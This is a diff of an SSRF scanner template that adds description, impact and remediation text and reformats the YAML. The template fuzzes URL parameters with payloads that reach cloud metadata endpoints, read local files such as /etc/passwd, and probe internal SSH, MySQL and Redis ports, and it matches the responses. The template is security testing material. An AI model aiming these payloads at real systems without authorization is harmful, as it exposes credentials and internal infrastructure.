@@ -1,136 +1,173 @@
 id: response-ssrf
-
 info:
   name: Full Response SSRF Detection
   author: pdteam,pwnhxl,j4vaovo,AmirHossein Raeisi
   severity: high
   reference:
-    - https://github.com/bugcrowd/HUNT/blob/master/ZAP/scripts/passive/SSRF.py
+  - https://github.com/bugcrowd/HUNT/blob/master/ZAP/scripts/passive/SSRF.py
   metadata:
     max-request: 12
   tags: ssrf,dast
+  description: The "Full Response SSRF Detection" vulnerability is a security flaw
+    that allows an attacker to obtain sensitive information by exploiting the way
+    a web application handles and processes user input. Server-Side Request Forgery
+    (SSRF) vulnerabilities occur when an application fails to properly validate or
+    sanitize user-supplied URLs, enabling the attacker to make unauthorized requests
+    to internal or external systems. In the case of "Full Response SSRF Detection,"
+    the vulnerability arises when the application returns the full response from the
+    malicious request, potentially exposing sensitive data such as internal network
+    information, authentication credentials, or other confidential details. This vulnerability
+    is particularly concerning as it can be leveraged by an attacker to gain a foothold
+    within the targeted system, escalate privileges, or launch further attacks, compromising
+    the overall security of the organization.
+  impact: '- Obtain sensitive information from the server, such as internal network
+    configurations, authentication credentials, or other confidential data.
 
+    - Potentially gain access to internal systems and networks by using the information
+    gathered through the SSRF vulnerability.
+
+    - Leverage the vulnerability to escalate privileges and further compromise the
+    targeted system or organization.
+
+    - Conduct additional attacks, such as lateral movement or data exfiltration, using
+    the information obtained through the SSRF vulnerability.
+
+    - Disrupt the normal operation of the application or the broader system by making
+    unauthorized requests through the SSRF vulnerability.'
+  remediation: 'To address the "Full Response SSRF Detection" vulnerability, it is
+    crucial to implement robust input validation and sanitization measures to prevent
+    unauthorized access to sensitive information. The following steps should be taken
+    to remediate this issue:
+
+
+    - Ensure that all user-supplied input, especially URLs, is thoroughly validated
+    and sanitized before being used in any server-side requests. Implement whitelisting
+    of allowed domains and IP addresses to prevent the application from making requests
+    to unauthorized or potentially malicious destinations.
+
+    - Limit the amount of information returned in the response, especially for error
+    messages or debugging information. Consider returning only the necessary data
+    required for the application''s functionality and avoid revealing sensitive details
+    that could aid an attacker.
+
+    - Implement a defense-in-depth approach by incorporating additional security controls,
+    such as network segmentation, access control lists, and firewalls, to restrict
+    the application''s communication with internal systems and limit the potential
+    damage from a successful SSRF attack.
+
+    - Regularly review and update the application''s security measures, staying informed
+    about the latest security best practices and vulnerabilities to ensure that the
+    application remains secure against evolving threats.
+
+    - Provide comprehensive security training and awareness programs for the development
+    team to ensure they understand the importance of input validation, secure coding
+    practices, and the potential impact of SSRF vulnerabilities.'
 http:
-  - pre-condition:
-      - type: dsl
-        dsl:
-          - 'method == "GET"'
-          - 'method == "POST"'
-
-    payloads:
-      ssrf:
-        - 'http://{{interactsh-url}}'
-        - 'http://{{FQDN}}.{{interactsh-url}}'
-        - 'http://{{FQDN}}@{{interactsh-url}}'
-        - 'http://{{interactsh-url}}#{{FQDN}}'
-        - 'http://{{RDN}}.{{interactsh-url}}'
-        - 'http://{{RDN}}@{{interactsh-url}}'
-        - 'http://{{interactsh-url}}#{{RDN}}'
-        - 'file:////./etc/./passwd'
-        - 'file:///c:/./windows/./win.ini'
-        - 'http://metadata.tencentyun.com/latest/meta-data/'
-        - 'http://100.100.100.200/latest/meta-data/'
-        - 'http://169.254.169.254/latest/meta-data/'
-        - 'http://169.254.169.254/metadata/v1'
-        - 'http://127.0.0.1:22'
-        - 'http://127.0.0.1:3306'
-        - 'dict://127.0.0.1:6379/info'
-
-    fuzzing:
-      - part: query
-        mode: single
-        keys:
-          - callback
-          - continue
-          - data
-          - dest
-          - dir
-          - domain
-          - feed
-          - file
-          - host
-          - html
-          - imgurl
-          - navigation
-          - next
-          - open
-          - out
-          - page
-          - path
-          - port
-          - redirect
-          - reference
-          - return
-          - show
-          - site
-          - to
-          - uri
-          - url
-          - val
-          - validate
-          - view
-          - window
-        fuzz:
-          - "{{ssrf}}"
-
-      - part: query
-        mode: single
-        values:
-          - "(https|http|file)(%3A%2F%2F|://)(.*?)"
-        fuzz:
-          - "{{ssrf}}"
-
-    stop-at-first-match: true
-    matchers-condition: or
-    matchers:
-
-      - type: word
-        part: body
-        words:
-          - "Interactsh Server"
-
-      - type: regex
-        part: body
-        regex:
-          - 'SSH-(\d.\d)-OpenSSH_(\d.\d)'
-
-      - type: regex
-        part: body
-        regex:
-          - '(DENIED Redis|CONFIG REWRITE|NOAUTH Authentication)'
-
-      - type: regex
-        part: body
-        regex:
-          - '(\d.\d.\d)(.*?)mysql_native_password'
-
-      - type: regex
-        part: body
-        regex:
-          - 'root:.*?:[0-9]*:[0-9]*:'
-
-      - type: word
-        part: body
-        words:
-          - 'for 16-bit app support'
-
-      - type: regex
-        part: body
-        regex:
-          - 'dns-conf\/[\s\S]+instance\/'
-
-      - type: regex
-        part: body
-        regex:
-          - 'app-id[\s\S]+placement\/'
-
-      - type: regex
-        part: body
-        regex:
-          - 'ami-id[\s\S]+placement\/'
-
-      - type: regex
-        part: body
-        regex:
-          - 'id[\s\S]+interfaces\/'
-# digest: 4a0a0047304502202fde4bfa65da3bf0c55b9b438cd860494fbd0663a658a93ecacfa6f796104b560221008a0a57e62fa458121b54a0aca4e8ce18ad30806a2680549345df96912af33d18:922c64590222798bb761d5b6d8e72950
+- pre-condition:
+  - type: dsl
+    dsl:
+    - method == "GET"
+    - method == "POST"
+  payloads:
+    ssrf:
+    - http://{{interactsh-url}}
+    - http://{{FQDN}}.{{interactsh-url}}
+    - http://{{FQDN}}@{{interactsh-url}}
+    - http://{{interactsh-url}}#{{FQDN}}
+    - http://{{RDN}}.{{interactsh-url}}
+    - http://{{RDN}}@{{interactsh-url}}
+    - http://{{interactsh-url}}#{{RDN}}
+    - file:////./etc/./passwd
+    - file:///c:/./windows/./win.ini
+    - http://metadata.tencentyun.com/latest/meta-data/
+    - http://100.100.100.200/latest/meta-data/
+    - http://169.254.169.254/latest/meta-data/
+    - http://169.254.169.254/metadata/v1
+    - http://127.0.0.1:22
+    - http://127.0.0.1:3306
+    - dict://127.0.0.1:6379/info
+  fuzzing:
+  - part: query
+    mode: single
+    keys:
+    - callback
+    - continue
+    - data
+    - dest
+    - dir
+    - domain
+    - feed
+    - file
+    - host
+    - html
+    - imgurl
+    - navigation
+    - next
+    - open
+    - out
+    - page
+    - path
+    - port
+    - redirect
+    - reference
+    - return
+    - show
+    - site
+    - to
+    - uri
+    - url
+    - val
+    - validate
+    - view
+    - window
+    fuzz:
+    - '{{ssrf}}'
+  - part: query
+    mode: single
+    values:
+    - (https|http|file)(%3A%2F%2F|://)(.*?)
+    fuzz:
+    - '{{ssrf}}'
+  stop-at-first-match: true
+  matchers-condition: or
+  matchers:
+  - type: word
+    part: body
+    words:
+    - Interactsh Server
+  - type: regex
+    part: body
+    regex:
+    - SSH-(\d.\d)-OpenSSH_(\d.\d)
+  - type: regex
+    part: body
+    regex:
+    - (DENIED Redis|CONFIG REWRITE|NOAUTH Authentication)
+  - type: regex
+    part: body
+    regex:
+    - (\d.\d.\d)(.*?)mysql_native_password
+  - type: regex
+    part: body
+    regex:
+    - 'root:.*?:[0-9]*:[0-9]*:'
+  - type: word
+    part: body
+    words:
+    - for 16-bit app support
+  - type: regex
+    part: body
+    regex:
+    - dns-conf\/[\s\S]+instance\/
+  - type: regex
+    part: body
+    regex:
+    - app-id[\s\S]+placement\/
+  - type: regex
+    part: body
+    regex:
+    - ami-id[\s\S]+placement\/
+  - type: regex
+    part: body
+    regex:
+    - id[\s\S]+interfaces\/
